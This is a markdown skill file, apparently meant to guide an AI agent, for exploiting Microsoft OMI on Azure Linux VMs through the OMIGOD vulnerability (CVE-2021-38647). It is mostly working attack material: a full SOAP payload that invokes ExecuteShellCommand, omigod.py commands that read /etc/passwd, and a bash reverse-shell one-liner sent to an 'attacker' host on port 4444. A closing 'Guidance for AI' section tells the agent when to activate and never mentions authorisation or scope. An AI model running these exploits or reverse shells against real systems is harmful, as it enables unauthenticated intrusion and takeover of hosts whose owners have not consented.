skills/network/other-services/references/omi-pentesting.md

# OMI (Open Management Infrastructure) Pentesting Skill

## Goal

Identify and exploit vulnerabilities in Microsoft OMI service, commonly found on Azure Linux VMs.

## Ports

- **5985** - WinRM HTTP (OMI on Linux)
- **5986** - WinRM HTTPS (OMI on Linux)
- **1270** - OMI default port

## Methodology

1. **Identify OMI Service:** Scan for OMI ports
2. **Check Version:** Determine if vulnerable version installed
3. **Test for CVEs:** Check for known vulnerabilities (OMIGOD)
4. **Exploit Vulnerabilities:** Achieve RCE or information disclosure
5. **Escalate Access:** Pivot or escalate privileges

## Enumeration

```bash
# Nmap scan
nmap -sV -p 5985,5986,1270 <target>

# Check for OMI
curl -s http://<target>:5985/wsman -H "Content-Type: application/soap+xml"
```

## OMIGOD Vulnerabilities (CVE-2021-38647)

```bash
# Critical RCE - no authentication required
# Affects OMI versions < 1.6.8-1

# Check version
curl -s -k https://<target>:5986/wsman -H "Content-Type: application/soap+xml"

# Exploit
python3 omigod.py -t <target> -c 'id'
```

## CVE-2021-38647 Exploit Payload

```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" 
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
  <s:Header>
    <a:To>HTTP://<target>:5986/wsman/</a:To>
    <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
    <a:ReplyTo>
      <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
    </a:ReplyTo>
    <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
    <w:OperationTimeout>PT1M30S</w:OperationTimeout>
  </s:Header>
  <s:Body>
    <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
      <p:command>id</p:command>
      <p:timeout>0</p:timeout>
    </p:ExecuteShellCommand_INPUT>
  </s:Body>
</s:Envelope>
```

## Information Disclosure (CVE-2021-38645, CVE-2021-38649)

```bash
# Read sensitive files via privilege escalation
# Local privilege escalation from low-priv user to root
```

## Automated Exploitation

```bash
# Using omigod.py
git clone https://github.com/horizon3ai/CVE-2021-38647
python3 omigod.py -t <target> -p 5986 -c 'cat /etc/passwd'

# Reverse shell
python3 omigod.py -t <target> -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
```

## Nuclei Templates

```bash
# Scan with nuclei
nuclei -u https://<target>:5986 -t cves/2021/CVE-2021-38647.yaml
```

## Azure Context

```bash
# OMI commonly installed with Azure extensions:
- Azure Automation
- Azure Log Analytics
- Azure Diagnostics
- Azure Security Center

# Check if target is Azure VM
curl -s -H "Metadata: true" http://169.254.169.254/metadata/instance
```

## Tools

* **omigod.py** - CVE-2021-38647 exploit
* **Nuclei** - Vulnerability scanning
* **Nmap** - Service detection

## Guidance for AI

* Activate when testing Azure Linux VMs or ports 5985/5986/1270
* OMIGOD (CVE-2021-38647) is critical RCE with no auth
* Check OMI version to determine exploitability
* OMI installed automatically with many Azure extensions
* Affects on-premises systems if OMI manually installed
* Patch: Upgrade to OMI version 1.6.8-1 or higher
